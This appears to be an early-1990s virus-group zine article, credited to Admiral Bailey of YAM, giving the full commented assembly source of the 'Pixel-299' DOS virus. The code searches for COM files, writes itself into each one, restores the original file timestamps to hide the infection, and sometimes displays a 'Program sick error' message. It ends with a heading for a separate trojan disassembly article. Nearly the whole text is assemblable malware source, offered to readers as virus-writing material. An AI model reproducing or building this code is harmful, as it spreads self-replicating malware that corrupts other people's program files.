
;*****************************************************************************
;
; Pixel - 299 virus
;
; Disassembled By Admiral Bailey [YAM '92]
;
; Notes: I dont know where the hell I got this one from but when I found it on
;        one of my disks it was named incorectly.  Some Amst shit but I looked
;        it up in the vsum and its named as Pixel so Il use that name.
;        Anyways its just a plain com infecting virus that displays a messege
;        when executed. Nothing big.
;
;*****************************************************************************

data_1e         equ     6Ch
data_2e         equ     96h
data_3e         equ     98h
data_4e         equ     9Eh
data_15e        equ     12Bh                    ;*
data_16e        equ     12Dh                    ;*

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

Pixel           proc    far

start:
                jmp     short begin
                dw      5649h
data_7          db      0
data_8          db      2Ah, 2Eh, 43h, 4Fh, 4Dh, 0      ; '*.com'
data_10         dw      0, 8918h
data_12         dw      0

begin:                                          ; loc_1:
                push    ax
                mov     ax,cs
                add     ax,1000h
                mov     es,ax
                inc     data_7
                mov     si,100h
                xor     di,di                   ; Zero register
                mov     cx,12Bh
                rep     movsb                   ; Mov [si] to es:[di]
                mov     dx,offset data_8        ; load the type of file to find
                mov     cx,6                    ; Im not sure what attrib
                mov     ah,4Eh                  ; Find first file
                int     21h                     ;

                jc      quit                    ; if none found then...
get_file:                                       ; loc_2
                mov     dx,data_4e              ; file name
                mov     ax,3D02h                ; open file
                int     21h

                mov     bx,ax
                push    es
                pop     ds
                mov     dx,data_15e             ; buffer for read
                mov     cx,0FFFFh               ; number of bytes to read
                mov     ah,3Fh                  ; read file
                int     21h

                add     ax,12Bh
                mov     cs:data_12,ax
                cmp     word ptr ds:data_16e,5649h ; probably comparing size
                je      not_this_file           ; of file
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                mov     ax,4200h                ; move file pointer
                int     21h                     

                jc      not_this_file           ; if error the quit this file
                xor     dx,dx                   ; Zero register
                mov     cx,cs:data_12
                mov     ah,40h                  ; write virus to file
                int     21h

                mov     cx,cs:data_2e           ; old date
                mov     dx,cs:data_3e           ; new time
                mov     ax,5701h                ; set files date & time
                int     21h                     

not_this_file:                                  ; loc_3:
                mov     ah,3Eh                  ; close this file
                int     21h

                push    cs
                pop     ds
                mov     ah,4Fh                  ; find another file
                int     21h                     
                                                
                jc      quit                    ; if none found quit
                jmp     short get_file          ; if found then infect
quit:                                           ; loc_4
                cmp     data_7,5
                jb      loc_5                   ; Jump if below
                mov     ax,40h
                mov     ds,ax
                mov     ax,ds:data_1e
                push    cs
                pop     ds
                and     ax,1
                jz      loc_5                   ; Jump if zero
                mov     dx,offset data_13       ; gets the messege
                mov     ah,9                    ; display string
                int     21h

                int     20h                     ; Quit program

data_13         db      'Program sick error:Call doctor o'  ; messege
                db      'r buy PIXEL for cure description'  ; displayed when
                db      0Ah, 0Dh, '$'                       ; run
loc_5:
                mov     si,offset data_14
                mov     cx,22h
                xor     di,di                   ; Zero register
                rep     movsb                   ; Rep when cx >0 Mov [si] to es
                pop     bx
                mov     cs:data_10,0
                mov     word ptr cs:data_10+2,es
                jmp     dword ptr cs:data_10

data_14         db      1Eh                             ; cant figure this
                db       07h,0BEh, 2Bh, 02h,0BFh, 00h   ; part out...
                db       01h,0B9h,0FFh,0FFh, 2Bh,0CEh   ; probably infected
                db      0F3h,0A4h, 2Eh,0C7h, 06h, 00h   ; file before.
                db       01h, 00h, 01h, 2Eh, 8Ch, 1Eh
                db       02h, 01h, 8Bh,0C3h, 2Eh,0FFh
                db       2Eh, 00h, 01h,0CDh             ; this is an int 20h
                db      20h

Pixel           endp

seg_a           ends

                end     start


ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #1 - YAM '92

Article Title: Thrasher Trojan Disassembly
Author: Natas Kaupas



